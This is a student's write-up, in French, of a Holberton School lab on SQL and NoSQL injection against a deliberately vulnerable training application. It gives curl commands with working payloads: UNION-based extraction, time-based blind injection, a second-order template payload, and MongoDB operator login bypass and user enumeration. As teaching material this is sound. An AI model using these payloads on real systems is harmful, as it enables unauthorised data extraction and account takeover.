# Web Application Security – SQL & NoSQL Injection
Holberton School – Cyber Security  
Projet : `web_application_security/0x03_sql_nosql_injection`

---

## 📌 Présentation du projet

Ce projet a pour objectif d’identifier et d’exploiter différentes vulnérabilités de type **SQL Injection** et **NoSQL Injection** dans une application web volontairement vulnérable.

Au fil des tâches, nous démontrons comment une mauvaise gestion des entrées utilisateur peut mener à :

- L’identification de paramètres vulnérables
- L’extraction d’informations sensibles
- Des injections aveugles (Blind SQLi)
- Des injections de second ordre
- Le contournement de l’authentification NoSQL
- L’énumération d’utilisateurs
- L’exploitation de la logique métier (crypto exchange)

⚠️ Toutes les techniques utilisées le sont **uniquement à des fins pédagogiques**.

---

## Task 0 – Identification d’une vulnérabilité SQL Injection

### 🎯 Objectif
Identifier le paramètre vulnérable à une injection SQL.

### 🔍 Méthode
Nous testons les paramètres de l’application avec des payloads simples :
- `'`
- `' OR '1'='1`

Nous observons les réponses du serveur (erreurs, comportements anormaux).

### ✅ Résultat
Le paramètre **`status`** est vulnérable à une SQL Injection.

### 📄 Fichier rendu
```bash
echo "status" > 0-vuln.txt
Task 1 – SQL Injection : Extraction des informations de la base de données
🎯 Objectif
Extraire :

La version de la base de données

Des informations internes

🔍 Méthode
Utilisation de UNION SELECT avec des fonctions SQLite.

🧪 Commande utilisée
bash
Copier le code
curl -s -H "Host: web0x01.hbtn" \
"http://<IP>/api/a3/sql_injection/all_orders?status=paid' UNION SELECT sqlite_version(),null,null,null,null--+"
✅ Résultat
La version de SQLite est révélée ainsi qu’un flag.

📄 Fichier rendu
Le flag est sauvegardé dans :

txt
Copier le code
1-flag.txt
Task 2 – SQL Injection : Exfiltration de données depuis une table spécifique
🎯 Objectif
Extraire des données sensibles depuis une table de la base.

🔍 Méthode
Lister les tables avec sqlite_master

Identifier une table suspecte

Extraire les données via UNION SELECT

🧪 Commandes utilisées
Lister les tables

bash
Copier le code
curl -s -H "Host: web0x01.hbtn" \
"http://<IP>/api/a3/sql_injection/all_orders?status=paid' AND 1=0 UNION SELECT name,null,null,null,null FROM sqlite_master WHERE type='table'--+"
Extraire les données

bash
Copier le code
curl -s -H "Host: web0x01.hbtn" \
"http://<IP>/api/a3/sql_injection/all_orders?status=paid' AND 1=0 UNION SELECT value,null,null,null,null FROM not_me--+"
✅ Résultat
Les données sont exfiltrées avec succès et un flag est récupéré.

📄 Fichier rendu
txt
Copier le code
2-flag.txt
Task 3 – SQL Injection : Blind SQL Injection basée sur le temps
🎯 Objectif
Détecter une injection SQL aveugle via un délai d’exécution (>5 secondes).

🔍 Méthode
Utilisation d’une opération coûteuse (randomblob) pour ralentir la requête.

🧪 Commande utilisée
bash
Copier le code
time curl -s -H "Host: web0x01.hbtn" \
"http://<IP>/api/a3/sql_injection/all_orders?status=paid' AND length(randomblob(50000000))>0--+"
✅ Résultat
Le temps de réponse dépasse 5 secondes et le flag est retourné.

📄 Fichier rendu
txt
Copier le code
3-flag.txt
Task 4 – SQL Injection : Injection de second ordre
🎯 Objectif
Injecter une charge utile stockée qui sera exécutée ultérieurement.

🔍 Méthode
Injection d’un payload Jinja lors de l’inscription, exécuté au moment de la connexion.

🧪 Commandes utilisées
Inscription

bash
Copier le code
curl -s -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \
-H "Content-Type: application/json" \
-d '{ "username": "{{ FLAG }}", "name": "test", "password": "test123" }'
Connexion

bash
Copier le code
curl -s -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \
-H "Content-Type: application/json" \
-d '{ "username": "{{ FLAG }}", "password": "test123" }'
✅ Résultat
Le payload est interprété lors de la connexion et le flag est affiché.

📄 Fichier rendu
txt
Copier le code
4-flag.txt
Task 5 – Identification d’une vulnérabilité NoSQL Injection
🎯 Objectif
Identifier un endpoint vulnérable à une NoSQL Injection.

🔍 Méthode
Tests d’entrées JSON avec des opérateurs MongoDB ($ne, $gt).

✅ Résultat
L’endpoint de connexion NoSQL est vulnérable.

📄 Fichier rendu
bash
Copier le code
echo "/api/a3/nosql_injection/sign_in" > 5-vuln.txt
Task 6 – NoSQL Injection : Contournement de l’authentification
🎯 Objectif
Se connecter sans identifiants valides via une NoSQL Injection.

🔍 Méthode
Injection d’opérateurs MongoDB pour contourner la vérification.

🧪 Commande utilisée
bash
Copier le code
curl -s -X POST http://web0x01.hbtn/api/a3/nosql_injection/sign_in \
-H "Content-Type: application/json" \
-d '{ "username": { "$ne": null }, "password": { "$ne": null } }'
✅ Résultat
Connexion réussie et récupération du flag.

📄 Fichier rendu
txt
Copier le code
6-flag.txt
Task 7 – NoSQL Injection : Énumération d’utilisateurs et exploitation de la logique métier
🎯 Objectif
Énumérer les utilisateurs

Identifier le compte le plus riche

Exploiter la logique de la plateforme d’échange de cryptomonnaies

🔍 Méthode
Connexion NoSQL ciblée sur différents utilisateurs

Accès à user_info

Analyse des portefeuilles

Vente des actifs (BTC, ETH, HBTNc) pour obtenir suffisamment de USD

Tentative d’achat de HBTNc

🧪 Exemple de commande
bash
Copier le code
curl -s -c cookies.txt -X POST http://web0x01.hbtn/api/a3/nosql_injection/sign_in \
-H "Content-Type: application/json" \
-d '{ "username": "elon-musk", "password": { "$ne": "" } }'
bash
Copier le code
curl -s -b cookies.txt http://web0x01.hbtn/api/a3/nosql_injection/user_info
🔑 Point clé
Le système d’échange n’autorise l’achat que via le solde USD.
Il est donc nécessaire de vendre toutes les cryptomonnaies pour convertir la valeur totale en USD avant de pouvoir acheter 1 HBTNc.

✅ Résultat
La logique métier est atteinte avec succès et le flag est obtenu.

📄 Fichier rendu
txt
Copier le code
7-flag.txt
✅ Conclusion
Ce projet met en évidence que :

Les injections SQL et NoSQL peuvent compromettre une application entière

La sécurité ne repose pas uniquement sur l’authentification

La logique métier est une cible critique

Une approche méthodique est essentielle en cybersécurité

🎉 Toutes les tâches ont été complétées avec succès.